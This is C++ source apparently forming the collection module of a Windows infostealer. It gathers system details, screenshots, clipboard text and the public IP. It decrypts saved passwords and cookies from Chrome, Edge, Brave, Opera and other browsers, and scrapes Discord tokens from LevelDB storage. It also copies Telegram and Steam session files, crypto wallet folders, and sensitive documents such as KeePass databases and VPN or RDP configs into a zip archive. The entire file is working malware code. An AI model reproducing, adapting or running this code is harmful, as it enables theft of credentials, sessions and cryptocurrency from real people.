#include "collect.h"
#include <set>
#include <algorithm>
#include <cwctype>

struct sqlite3;
struct sqlite3_stmt;
typedef int (*sqlite3_open_t)(const char*, sqlite3**);
typedef int (*sqlite3_prepare_v2_t)(sqlite3*, const char*, int, sqlite3_stmt**, const char**);
typedef int (*sqlite3_step_t)(sqlite3_stmt*);
typedef const unsigned char* (*sqlite3_column_text_t)(sqlite3_stmt*, int);
typedef int (*sqlite3_column_bytes_t)(sqlite3_stmt*, int);
typedef const void* (*sqlite3_column_blob_t)(sqlite3_stmt*, int);
typedef int (*sqlite3_finalize_t)(sqlite3_stmt*);
typedef int (*sqlite3_close_t)(sqlite3*);

// ---------------------------------------------------------------- system info

static std::string RunCmd(const wchar_t* cmd) {
    std::string out;
    SECURITY_ATTRIBUTES sa{ sizeof(sa), nullptr, TRUE };
    HANDLE rd = nullptr, wr = nullptr;
    if (!CreatePipe(&rd, &wr, &sa, 0)) return out;
    SetHandleInformation(rd, HANDLE_FLAG_INHERIT, 0);
    STARTUPINFOW si{}; si.cb = sizeof(si);
    si.dwFlags = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW;
    si.wShowWindow = SW_HIDE;
    si.hStdOutput = wr; si.hStdError = wr; si.hStdInput = nullptr;
    PROCESS_INFORMATION pi{};
    std::wstring c = cmd;
    if (CreateProcessW(nullptr, c.data(), nullptr, nullptr, TRUE, CREATE_NO_WINDOW,
                       nullptr, nullptr, &si, &pi)) {
        CloseHandle(wr);
        char buf[4096]; DWORD got = 0;
        while (ReadFile(rd, buf, sizeof(buf), &got, nullptr) && got) out.append(buf, got);
        WaitForSingleObject(pi.hProcess, 15000);
        CloseHandle(pi.hThread); CloseHandle(pi.hProcess);
    }
    CloseHandle(rd);
    return out;
}

void CollectSystem(Zip& z) {
    std::string info;
    wchar_t comp[256] = L""; DWORD csz = 256;
    GetComputerNameW(comp, &csz);
    wchar_t user[256] = L""; DWORD usz = 256;
    GetUserNameW(user, &usz);
    OSVERSIONINFOW vi{}; vi.dwOSVersionInfoSize = sizeof(vi);
    {
        typedef LONG(WINAPI* RtlGetVersion_t)(OSVERSIONINFOW*);
        HMODULE nt = GetModuleHandleW(L"ntdll.dll");
        auto fn = (RtlGetVersion_t)GetProcAddress(nt, "RtlGetVersion");
        if (fn) fn(&vi);
    }
    MEMORYSTATUSEX ms{}; ms.dwLength = sizeof(ms); GlobalMemoryStatusEx(&ms);

    char b[1024];
    sprintf_s(b, "computer: %ls\nuser: %ls\nos: %lu.%lu.%lu\nram_mb: %llu\n",
              comp, user, vi.dwMajorVersion, vi.dwMinorVersion, vi.dwBuildNumber,
              (unsigned long long)(ms.ullTotalPhys / (1024 * 1024)));
    info += b;

    for (const wchar_t* key : { L"HARDWARE\\DESCRIPTION\\System\\CentralProcessor\\0" }) {
        HKEY h;
        if (RegOpenKeyExW(HKEY_LOCAL_MACHINE, key, 0, KEY_READ, &h) == ERROR_SUCCESS) {
            wchar_t val[512]; DWORD sz = sizeof(val); DWORD type = 0;
            if (RegQueryValueExW(h, L"ProcessorNameString", nullptr, &type, (LPBYTE)val, &sz) == ERROR_SUCCESS) {
                info += "cpu: " + ToUtf8(val) + "\n";
            }
            RegCloseKey(h);
        }
    }
    {
        HKEY h;
        if (RegOpenKeyExW(HKEY_LOCAL_MACHINE,
                          L"SYSTEM\\CurrentControlSet\\Control\\Class\\{4d36e968-e325-11ce-bfc1-08002be10318}\\0000",
                          0, KEY_READ, &h) == ERROR_SUCCESS) {
            wchar_t val[512]; DWORD sz = sizeof(val); DWORD type = 0;
            if (RegQueryValueExW(h, L"DriverDesc", nullptr, &type, (LPBYTE)val, &sz) == ERROR_SUCCESS)
                info += "gpu: " + ToUtf8(val) + "\n";
            RegCloseKey(h);
        }
    }
    info += "drives:\n" + RunCmd(L"wmic logicaldisk get name,size,freespace");
    z.AddText("System/info.txt", info);

    // screenshot
    int w = GetSystemMetrics(SM_CXVIRTUALSCREEN), hgt = GetSystemMetrics(SM_CYVIRTUALSCREEN);
    if (w > 0 && hgt > 0) {
        HDC hScreen = GetDC(nullptr), hMem = CreateCompatibleDC(hScreen);
        HBITMAP hBmp = CreateCompatibleBitmap(hScreen, w, hgt);
        HGDIOBJ old = SelectObject(hMem, hBmp);
        BitBlt(hMem, 0, 0, w, hgt, hScreen, GetSystemMetrics(SM_XVIRTUALSCREEN),
               GetSystemMetrics(SM_YVIRTUALSCREEN), SRCCOPY);
        SelectObject(hMem, old);
        BITMAPFILEHEADER fh{}; BITMAPINFOHEADER ih{};
        ih.biSize = sizeof(ih); ih.biWidth = w; ih.biHeight = hgt; ih.biPlanes = 1;
        ih.biBitCount = 24; ih.biCompression = BI_RGB;
        DWORD stride = ((w * 3 + 3) & ~3u);
        DWORD imgSize = stride * hgt;
        Bytes bmp(sizeof(BITMAPFILEHEADER) + sizeof(BITMAPINFOHEADER) + imgSize);
        fh.bfType = 0x4D42;
        fh.bfOffBits = sizeof(fh) + sizeof(ih);
        fh.bfSize = (DWORD)bmp.size();
        memcpy(bmp.data(), &fh, sizeof(fh));
        memcpy(bmp.data() + sizeof(fh), &ih, sizeof(ih));
        BITMAPINFO bi{}; bi.bmiHeader = ih;
        GetDIBits(hMem, hBmp, 0, hgt, bmp.data() + sizeof(fh) + sizeof(ih), &bi, DIB_RGB_COLORS);
        z.Add("System/screen.bmp", bmp);
        DeleteObject(hBmp); DeleteDC(hMem); ReleaseDC(nullptr, hScreen);
    }

    // clipboard
    if (OpenClipboard(nullptr)) {
        if (HANDLE hd = GetClipboardData(CF_UNICODETEXT)) {
            if (auto p = (wchar_t*)GlobalLock(hd)) {
                z.AddText("System/clipboard.txt", ToUtf8(p));
                GlobalUnlock(hd);
            }
        }
        CloseClipboard();
    }

    // public IP
    {
        HINTERNET s = WinHttpOpen(L"r", WINHTTP_ACCESS_TYPE_AUTOMATIC_PROXY, WINHTTP_NO_PROXY_NAME,
                                  WINHTTP_NO_PROXY_BYPASS, 0);
        if (s) {
            HINTERNET c = WinHttpConnect(s, L"ip-api.com", 80, 0);
            if (c) {
                HINTERNET r = WinHttpOpenRequest(c, L"GET", L"/line/?fields=query,isp,country,city",
                                                 nullptr, WINHTTP_NO_REFERER,
                                                 WINHTTP_DEFAULT_ACCEPT_TYPES, 0);
                if (r && WinHttpSendRequest(r, WINHTTP_NO_ADDITIONAL_HEADERS, 0, nullptr, 0, 0, 0)
                    && WinHttpReceiveResponse(r, nullptr)) {
                    std::string body;
                    DWORD avail = 0;
                    do {
                        WinHttpQueryDataAvailable(r, &avail);
                        if (!avail) break;
                        std::string chunk(avail, 0);
                        DWORD rd = 0;
                        WinHttpReadData(r, chunk.data(), avail, &rd);
                        body.append(chunk.data(), rd);
                    } while (avail > 0);
                    z.AddText("System/ip.txt", body);
                }
                if (r) WinHttpCloseHandle(r);
                WinHttpCloseHandle(c);
            }
            WinHttpCloseHandle(s);
        }
    }
    Log("system collected");
}

// ---------------------------------------------------------------- sqlite glue

struct SqliteLib {
    HMODULE h = nullptr;
    sqlite3_open_t open = nullptr;
    sqlite3_prepare_v2_t prepare = nullptr;
    sqlite3_step_t step = nullptr;
    sqlite3_column_text_t col_text = nullptr;
    sqlite3_column_bytes_t col_bytes = nullptr;
    sqlite3_column_blob_t col_blob = nullptr;
    sqlite3_finalize_t finalize = nullptr;
    sqlite3_close_t close = nullptr;

    bool Load() {
        if (h) return true;
        h = LoadLibraryW(L"winsqlite3.dll");
        if (!h) h = LoadLibraryW(L"sqlite3.dll");
        if (!h) { Log("sqlite not available"); return false; }
        open = (sqlite3_open_t)GetProcAddress(h, "sqlite3_open");
        prepare = (sqlite3_prepare_v2_t)GetProcAddress(h, "sqlite3_prepare_v2");
        step = (sqlite3_step_t)GetProcAddress(h, "sqlite3_step");
        col_text = (sqlite3_column_text_t)GetProcAddress(h, "sqlite3_column_text");
        col_bytes = (sqlite3_column_bytes_t)GetProcAddress(h, "sqlite3_column_bytes");
        col_blob = (sqlite3_column_blob_t)GetProcAddress(h, "sqlite3_column_blob");
        finalize = (sqlite3_finalize_t)GetProcAddress(h, "sqlite3_finalize");
        close = (sqlite3_close_t)GetProcAddress(h, "sqlite3_close");
        return open && prepare && step && col_text && col_blob && finalize && close;
    }
};

static SqliteLib g_sql;

// ---------------------------------------------------------------- chrome

static Bytes ChromeKey(const fs::path& userData) {
    Bytes state = ReadAll(userData / L"Local State");
    if (state.empty()) return {};
    std::string js(state.begin(), state.end());
    std::string b64 = JsonString(js, "encrypted_key");
    Bytes raw = Base64Decode(b64);
    if (raw.size() > 5 && memcmp(raw.data(), "DPAPI", 5) == 0)
        raw.erase(raw.begin(), raw.begin() + 5);
    return DpapiDecrypt(raw);
}

static Bytes ChromeDecrypt(const Bytes& v, const Bytes& key) {
    if (v.size() < 3) return DpapiDecrypt(v);
    if (v.size() > 15 + 16 && (memcmp(v.data(), "v10", 3) == 0 || memcmp(v.data(), "v11", 3) == 0)) {
        Bytes nonce(v.begin() + 3, v.begin() + 15);
        Bytes ct(v.begin() + 15, v.end() - 16);
        Bytes tag(v.end() - 16, v.end());
        return AesGcmDecrypt(key, nonce, ct, tag);
    }
    if (memcmp(v.data(), "v20", 3) == 0) return {};  // app-bound, needs elevation trick
    return DpapiDecrypt(v);
}

static fs::path CopyToTemp(const fs::path& src, const std::wstring& tag) {
    fs::path dir = OutDir() / L"tmp";
    std::error_code ec;
    fs::create_directories(dir, ec);
    fs::path tmp = dir / (tag + L"_" + ToWide(NowStamp()) + L".db");
    if (!CopyFileShared(src, tmp)) return {};
    return tmp;
}

static void DumpChromium(const fs::path& userData, const std::string& label, Zip& z) {
    if (!fs::exists(userData)) return;
    Bytes key = ChromeKey(userData);
    if (key.empty()) Log("%s: no key", label.c_str());

    std::vector<fs::path> profiles;
    std::error_code ec;
    for (auto& e : fs::directory_iterator(userData, ec)) {
        if (ec) break;
        if (!e.is_directory()) continue;
        auto name = e.path().filename().wstring();
        if (name == L"Default" || name.rfind(L"Profile ", 0) == 0 || name == L"Guest Profile")
            profiles.push_back(e.path());
    }

    for (auto& prof : profiles) {
        std::string pn = ToUtf8(prof.filename().wstring());
        std::string base = "Browsers/" + label + "/" + pn + "/";

        fs::path loginDb = CopyToTemp(prof / L"Login Data", L"ld");
        if (!loginDb.empty() && g_sql.Load()) {
            sqlite3* db = nullptr;
            if (g_sql.open(ToUtf8(loginDb.wstring()).c_str(), &db) == 0) {
                sqlite3_stmt* st = nullptr;
                if (g_sql.prepare(db, "SELECT origin_url, username_value, password_value FROM logins", -1, &st, nullptr) == 0) {
                    std::string out;
                    while (g_sql.step(st) == 100) {
                        const char* url = (const char*)g_sql.col_text(st, 0);
                        const char* usr = (const char*)g_sql.col_text(st, 1);
                        const void* blob = g_sql.col_blob(st, 2);
                        int blen = g_sql.col_bytes(st, 2);
                        Bytes enc((const unsigned char*)blob, (const unsigned char*)blob + blen);
                        Bytes dec = ChromeDecrypt(enc, key);
                        out += std::string(url ? url : "") + "\t" + std::string(usr ? usr : "") + "\t" +
                               std::string(dec.begin(), dec.end()) + "\n";
                    }
                    g_sql.finalize(st);
                    if (!out.empty()) z.AddText(base + "passwords.txt", out);
                }
                g_sql.close(db);
            }
            fs::remove(loginDb, ec);
        }

        fs::path cookieDb = CopyToTemp(prof / L"Network" / L"Cookies", L"ck");
        if (cookieDb.empty()) cookieDb = CopyToTemp(prof / L"Cookies", L"ck");
        if (!cookieDb.empty() && g_sql.Load()) {
            sqlite3* db = nullptr;
            if (g_sql.open(ToUtf8(cookieDb.wstring()).c_str(), &db) == 0) {
                sqlite3_stmt* st = nullptr;
                if (g_sql.prepare(db, "SELECT host_key, name, encrypted_value, path, expires_utc FROM cookies", -1, &st, nullptr) == 0) {
                    std::string out = "# Netscape HTTP Cookie File\n";
                    while (g_sql.step(st) == 100) {
                        const char* host = (const char*)g_sql.col_text(st, 0);
                        const char* nm = (const char*)g_sql.col_text(st, 1);
                        const void* blob = g_sql.col_blob(st, 2);
                        int blen = g_sql.col_bytes(st, 2);
                        Bytes enc((const unsigned char*)blob, (const unsigned char*)blob + blen);
                        Bytes dec = ChromeDecrypt(enc, key);
                        out += std::string(host ? host : "") + "\tTRUE\t/\tFALSE\t0\t" +
                               std::string(nm ? nm : "") + "\t" + std::string(dec.begin(), dec.end()) + "\n";
                    }
                    g_sql.finalize(st);
                    z.AddText(base + "cookies.txt", out);
                }
                g_sql.close(db);
            }
            fs::remove(cookieDb, ec);
        }

        z.AddFile(base + "Login Data.raw", prof / L"Login Data");
        z.AddFile(base + "History.raw", prof / L"History");
        z.AddFile(base + "Web Data.raw", prof / L"Web Data");
    }
    Log("%s: done", label.c_str());
}

void CollectBrowsers(Zip& z) {
    struct B { const wchar_t* path; const char* name; };
    const wchar_t* local = L"LOCALAPPDATA", * roaming = L"APPDATA";
    std::wstring L = Env(local), R = Env(roaming);
    std::vector<std::pair<fs::path, std::string>> list = {
        { fs::path(L) / L"Google/Chrome/User Data", "Chrome" },
        { fs::path(L) / L"Microsoft/Edge/User Data", "Edge" },
        { fs::path(L) / L"BraveSoftware/Brave-Browser/User Data", "Brave" },
        { fs::path(L) / L"Yandex/YandexBrowser/User Data", "Yandex" },
        { fs::path(L) / L"Vivaldi/User Data", "Vivaldi" },
        { fs::path(L) / L"Chromium/User Data", "Chromium" },
        { fs::path(R) / L"Opera Software/Opera Stable", "Opera" },
        { fs::path(R) / L"Opera Software/Opera GX Stable", "OperaGX" },
    };
    for (auto& [p, n] : list) DumpChromium(p, n, z);
}

// ---------------------------------------------------------------- firefox

void CollectFirefox(Zip& z) {
    fs::path prof = fs::path(Env(L"APPDATA")) / L"Mozilla" / L"Firefox" / L"Profiles";
    std::error_code ec;
    if (!fs::exists(prof, ec)) return;
    for (auto& e : fs::directory_iterator(prof, ec)) {
        if (ec) break;
        if (!e.is_directory()) continue;
        std::string base = "Browsers/Firefox/" + ToUtf8(e.path().filename().wstring()) + "/";
        for (const wchar_t* f : { L"logins.json", L"key4.db", L"cookies.sqlite", L"places.sqlite", L"prefs.js" })
            z.AddFile(base + ToUtf8(f), e.path() / f);
    }
    Log("firefox done");
}

// ---------------------------------------------------------------- discord

static bool RdVar(const Bytes& d, size_t& i, size_t& v) {
    v = 0; int sh = 0;
    while (i < d.size()) {
        unsigned char c = d[i++];
        v |= (size_t)(c & 0x7F) << sh;
        sh += 7;
        if (!(c & 0x80)) return true;
        if (sh > 63) return false;
    }
    return false;
}

static bool SnappyUncompress(const unsigned char* p, size_t n, Bytes& out) {
    size_t i = 0;
    auto rdvar = [&](uint64_t& v) -> bool {
        v = 0; int sh = 0;
        while (i < n) {
            unsigned char c = p[i++];
            v |= (uint64_t)(c & 0x7F) << sh;
            sh += 7;
            if (!(c & 0x80)) return true;
            if (sh > 63) return false;
        }
        return false;
    };
    uint64_t ulen = 0;
    if (!rdvar(ulen)) return false;
    out.clear();
    out.reserve((size_t)ulen);
    while (i < n) {
        unsigned char tag = p[i++];
        unsigned t = tag & 3;
        if (t == 0) {
            size_t len = (tag >> 2) + 1;
            if (len > 60) {
                size_t nb = len - 60;
                if (i + nb > n) return false;
                len = 0;
                for (size_t k = 0; k < nb; k++) len |= (size_t)p[i + k] << (8 * k);
                len += 1;
                i += nb;
            }
            if (i + len > n) return false;
            out.insert(out.end(), p + i, p + i + len);
            i += len;
        } else {
            size_t len = 0, off = 0;
            if (t == 1) {
                if (i + 1 > n) return false;
                len = ((tag >> 2) & 7) + 4;
                off = ((size_t)(tag >> 5) << 8) | p[i];
                i += 1;
            } else if (t == 2) {
                if (i + 2 > n) return false;
                len = (tag >> 2) + 1;
                off = (size_t)p[i] | ((size_t)p[i + 1] << 8);
                i += 2;
            } else {
                if (i + 4 > n) return false;
                len = (tag >> 2) + 1;
                off = (size_t)p[i] | ((size_t)p[i + 1] << 8) |
                      ((size_t)p[i + 2] << 16) | ((size_t)p[i + 3] << 24);
                i += 4;
            }
            if (off == 0 || off > out.size()) return false;
            size_t start = out.size() - off;
            for (size_t k = 0; k < len; k++) out.push_back(out[start + k]);
        }
        if (out.size() > (64u << 20)) return false;
    }
    return true;
}

static Bytes ReadBlock(const Bytes& d, size_t off, size_t sz, unsigned char typ) {
    if (off + sz > d.size()) return {};
    if (typ == 1) {
        Bytes o;
        if (!SnappyUncompress(d.data() + off, sz, o)) return {};
        return o;
    }
    return Bytes(d.begin() + off, d.begin() + off + sz);
}

static void ScanTokens(const Bytes& data, std::set<std::string>& out) {
    auto isTok = [](unsigned char c) {
        return (c >= 'A' && c <= 'Z') || (c >= 'a' && c <= 'z') || (c >= '0' && c <= '9') || c == '_' || c == '-';
    };
    size_t i = 0;
    while (i < data.size()) {
        if (!isTok(data[i])) { i++; continue; }
        size_t j = i;
        while (j < data.size() && isTok(data[j])) j++;
        std::string run((const char*)data.data() + i, j - i);
        std::vector<std::string> parts;
        size_t s = 0;
        while (true) {
            size_t d = run.find('.', s);
            if (d == std::string::npos) { parts.push_back(run.substr(s)); break; }
            parts.push_back(run.substr(s, d - s));
            s = d + 1;
        }
        if (parts.size() == 3) {
            bool ok = (parts[0] == "mfa" || (parts[0].size() >= 24 && parts[0].size() <= 28)) &&
                      parts[1].size() == 6 &&
                      parts[2].size() >= 27 && parts[2].size() <= 40;
            if (ok) out.insert(run);
        }
        i = j;
    }
}

static void ScanLevelDb(const Bytes& d, std::set<std::string>& toks) {
    ScanTokens(d, toks);
    if (d.size() < 64) return;
    size_t i = d.size() - 48;
    size_t mi = 0, ms = 0, io = 0, isz = 0;
    if (!RdVar(d, i, mi) || !RdVar(d, i, ms) || !RdVar(d, i, io) || !RdVar(d, i, isz)) return;
    if (io + isz + 1 > d.size()) return;
    Bytes idx = ReadBlock(d, io, isz, d[io + isz]);
    if (idx.empty()) return;
    size_t j = 0;
    while (j + 2 < idx.size()) {
        size_t k = 0, off = 0, sz = 0;
        if (!RdVar(idx, j, k)) break;
        j += k;
        if (!RdVar(idx, j, off) || !RdVar(idx, j, sz)) break;
        if (sz == 0 || off + sz + 1 > d.size()) continue;
        Bytes blk = ReadBlock(d, off, sz, d[off + sz]);
        if (!blk.empty()) ScanTokens(blk, toks);
    }
}

void CollectDiscord(Zip& z) {
    std::set<std::string> tokens;
    std::vector<std::pair<fs::path, std::string>> dirs = {
        { fs::path(Env(L"APPDATA")) / L"discord/Local Storage/leveldb", "discord" },
        { fs::path(Env(L"APPDATA")) / L"discordptb/Local Storage/leveldb", "discordptb" },
        { fs::path(Env(L"APPDATA")) / L"discordcanary/Local Storage/leveldb", "discordcanary" },
        { fs::path(Env(L"APPDATA")) / L"Lightcord/Local Storage/leveldb", "lightcord" },
    };
    for (auto& [dir, name] : dirs) {
        std::error_code ec;
        if (!fs::exists(dir, ec)) continue;
        for (auto& e : fs::directory_iterator(dir, ec)) {
            if (ec) break;
            if (!e.is_regular_file()) continue;
            auto ext = e.path().extension().wstring();
            if (ext == L".ldb") ScanLevelDb(ReadAll(e.path()), tokens);
            else if (ext == L".log") ScanTokens(ReadAll(e.path()), tokens);
        }
        z.AddTree("Discord/" + name, dir, 32u << 20);
    }

    std::wstring L = Env(L"LOCALAPPDATA");
    for (const wchar_t* p : { L"Google/Chrome/User Data", L"Microsoft/Edge/User Data",
                              L"BraveSoftware/Brave-Browser/User Data" }) {
        std::error_code ec;
        fs::path root = fs::path(L) / p;
        if (!fs::exists(root, ec)) continue;
        for (auto& e : fs::directory_iterator(root, ec)) {
            if (ec) break;
            if (!e.is_directory()) continue;
            fs::path ls = e.path() / L"Local Storage" / L"leveldb";
            if (!fs::exists(ls, ec)) continue;
            for (auto& f : fs::directory_iterator(ls, ec)) {
                if (ec) break;
                if (!f.is_regular_file()) continue;
                auto ext = f.path().extension().wstring();
                if (ext == L".ldb") ScanLevelDb(ReadAll(f.path()), tokens);
                else if (ext == L".log") ScanTokens(ReadAll(f.path()), tokens);
            }
        }
    }

    std::string out;
    for (auto& t : tokens) out += t + "\n";
    if (!out.empty()) z.AddText("Discord/tokens.txt", out);
    Log("discord done, tokens=%zu", tokens.size());
}

// ---------------------------------------------------------------- telegram

void CollectTelegram(Zip& z) {
    fs::path tdata = fs::path(Env(L"APPDATA")) / L"Telegram Desktop" / L"tdata";
    std::error_code ec;
    if (!fs::exists(tdata, ec)) return;
    z.AddTree("Telegram/tdata", tdata, 64u << 20);
    Log("telegram done");
}

// ---------------------------------------------------------------- steam

void CollectSteam(Zip& z) {
    std::vector<fs::path> roots;
    roots.push_back(fs::path(Env(L"PROGRAMFILES(X86)")) / L"Steam");
    roots.push_back(fs::path(Env(L"PROGRAMFILES")) / L"Steam");
    roots.push_back(fs::path(Env(L"LOCALAPPDATA")) / L"Steam");
    for (auto& r : roots) {
        std::error_code ec;
        if (!fs::exists(r, ec)) continue;
        z.AddFile("Steam/config/config.vdf", r / L"config" / L"config.vdf");
        z.AddFile("Steam/config/loginusers.vdf", r / L"config" / L"loginusers.vdf");
        for (auto& e : fs::directory_iterator(r, ec)) {
            if (ec) break;
            auto nm = e.path().filename().wstring();
            if (nm.rfind(L"ssfn", 0) == 0) z.AddFile("Steam/" + ToUtf8(nm), e.path());
        }
    }
    Log("steam done");
}

// ---------------------------------------------------------------- wallets

void CollectWallets(Zip& z) {
    std::wstring R = Env(L"APPDATA"), L = Env(L"LOCALAPPDATA");
    struct W { fs::path path; const char* name; };
    std::vector<W> list = {
        { fs::path(R) / L"Exodus/exodus.wallet", "Exodus" },
        { fs::path(R) / L"Electrum/wallets", "Electrum" },
        { fs::path(R) / L"Atomic/Local Storage/leveldb", "Atomic" },
        { fs::path(R) / L"Guarda/Local Storage/leveldb", "Guarda" },
        { fs::path(R) / L"Coinomi", "Coinomi" },
        { fs::path(R) / L"Wasabi Wallet", "Wasabi" },
        { fs::path(R) / L"Armory", "Armory" },
        { fs::path(R) / L"Bitcoin/wallets", "BitcoinCore" },
        { fs::path(R) / L"Ethereum/keystore", "Geth" },
        { fs::path(R) / L"Binance", "Binance" },
        { fs::path(L) / L"Ethereum/keystore", "GethLocal" },
        { fs::path(R) / L"Monero/wallets", "Monero" },
        { fs::path(R) / L"Zcash", "Zcash" },
    };
    for (auto& w : list) {
        std::error_code ec;
        if (!fs::exists(w.path, ec)) continue;
        if (fs::is_directory(w.path, ec)) z.AddTree(std::string("Wallets/") + w.name, w.path, 48u << 20);
        else z.AddFile(std::string("Wallets/") + w.name + "/" + ToUtf8(w.path.filename().wstring()), w.path);
    }
    Log("wallets done");
}

// ---------------------------------------------------------------- grabber

void CollectGrabber(Zip& z) {
    static const wchar_t* exts[] = { L".txt", L".pdf", L".doc", L".docx", L".xls", L".xlsx", L".csv",
                                     L".kdbx", L".key", L".ovpn", L".rdp", L".sql", L".db", L".wallet",
                                     L".json", L".png", L".jpg" };
    int n = 0;
    uint64_t total = 0;
    for (const wchar_t* d : { L"Desktop", L"Documents", L"Downloads" }) {
        fs::path dir = fs::path(Env(L"USERPROFILE")) / d;
        std::error_code ec;
        if (!fs::exists(dir, ec)) continue;
        for (auto& e : fs::recursive_directory_iterator(dir, fs::directory_options::skip_permission_denied, ec)) {
            if (ec || n >= 40 || total > (64u << 20)) break;
            if (!e.is_regular_file(ec)) continue;
            uint64_t sz = e.file_size(ec);
            if (ec || sz == 0 || sz > (8u << 20)) continue;
            std::wstring ext = e.path().extension().wstring();
            std::transform(ext.begin(), ext.end(), ext.begin(), towlower);
            bool want = false;
            for (auto x : exts) if (ext == x) { want = true; break; }
            if (!want) continue;
            std::error_code rec;
            fs::path rel = fs::relative(e.path(), dir, rec);
            if (rec) rel = e.path().filename();
            z.AddFile("Grab/" + ToUtf8(dir.filename().wstring()) + "/" + ToUtf8(rel.wstring()), e.path());
            total += sz; n++;
        }
    }
    Log("grabber done, files=%d", n);
}
